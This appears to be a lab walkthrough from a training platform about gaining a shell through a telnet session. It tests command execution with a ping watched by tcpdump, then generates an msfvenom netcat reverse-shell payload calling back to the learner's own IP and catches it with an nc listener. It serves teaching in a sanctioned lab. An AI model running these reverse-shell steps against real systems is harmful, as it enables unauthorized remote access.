# 🔎 TCP dump

Start a tcpdump listener on your local machine.\
**If using your own machine with the OpenVPN connection, use:**

• `sudo tcpdump ip proto \\icmp -i tun0`

**If using the AttackBox, use:**\
◇ `sudo tcpdump ip proto \\icmp -i ens5`

This starts a tcpdump listener, specifically listening for ICMP traffic, which pings operate on.

Now, use the command **"ping \[local THM ip] -c 1"** through the telnet session to see if we're able to execute system commands. Do we receive any pings? Note, you need to preface this with .RUN (Y/N)

Great! This means that we are able to execute system commands AND that we are able to reach our local machine. Now let's have some fun!

We're going to generate a reverse shell payload using msfvenom.This will generate and encode a netcat reverse shell for us. Here's our syntax:



```bash
msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R
```

\-p = payload\
lhost = our local host IP address (this is **your**┬ámachine's IP address)\
lport = the port to listen on (this is the port on **your** machine)\
R = export the payload in raw format

What word does the generated payload start with?

Perfect. We're nearly there. Now all we need to do is start a netcat listener on our local machine. We do this using:\
**"nc -lvp \[listening port]"**\
What would the command look like for the listening port we selected in our payload?

Great! Now that's running, we need to copy and paste our msfvenom payload into the telnet session and run it as a command. Hopefully- this will give us a shell on the target machine!
